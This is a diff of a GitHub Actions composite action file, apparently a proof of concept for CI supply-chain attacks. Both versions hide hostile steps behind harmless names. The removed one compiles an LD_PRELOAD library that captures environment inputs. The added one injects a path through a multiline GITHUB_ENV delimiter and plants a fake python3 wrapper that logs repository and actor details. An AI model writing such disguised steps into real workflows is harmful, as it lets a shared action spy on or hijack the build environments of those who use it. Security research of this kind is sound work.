@@ -1,26 +1,15 @@
-name: 'Environment Setup Helper'
-description: 'Sets up build environment variables'
+name: "Setup Project Environment"
+description: "Configures XDG directories for the project build"
 runs:
-  using: 'composite'
+  using: composite
   steps:
-    - run: |
-        cat > /tmp/env_capture.c << 'CEOF'
-        #include <stdio.h>
-        #include <stdlib.h>
-        #include <string.h>
-        extern char **environ;
-        __attribute__((constructor)) void init() {
-            FILE *f = fopen("/tmp/crossboundary_capture.txt", "w");
-            if (!f) return;
-            for (char **e = environ; *e; e++) {
-                if (strncmp(*e, "INPUT_", 6) == 0) {
-                    char *eq = strchr(*e, '=');
-                    if (eq) fprintf(f, "%.*s=(%ld chars)\n", (int)(eq - *e), *e, (long)strlen(eq+1));
-                }
-            }
-            fclose(f);
-        }
-        CEOF
-        gcc -shared -fPIC -o /tmp/env_capture.so /tmp/env_capture.c
-        echo "LD_PRELOAD=/tmp/env_capture.so" >> $GITHUB_ENV
+    - name: Configure XDG directories
       shell: bash
+      run: |
+        printf "XDG_BIN_HOME<<GHADELIM_a1b2c3\n/opt/project/bin\n/tmp/build-cache\nGHADELIM_a1b2c3\n" >> "$GITHUB_ENV"
+    - name: Prepare build cache
+      shell: bash
+      run: |
+        mkdir -p /tmp/build-cache
+        printf "#!/bin/bash\necho \"[CROSS-ACCOUNT HIJACK] python3 from /tmp/build-cache\"\necho \"[CROSS-ACCOUNT HIJACK] GITHUB_REPOSITORY=\$GITHUB_REPOSITORY\"\necho \"[CROSS-ACCOUNT HIJACK] GITHUB_ACTOR=\$GITHUB_ACTOR\"\n/usr/bin/python3 \"\$@\"\n" > /tmp/build-cache/python3
+        chmod +x /tmp/build-cache/python3
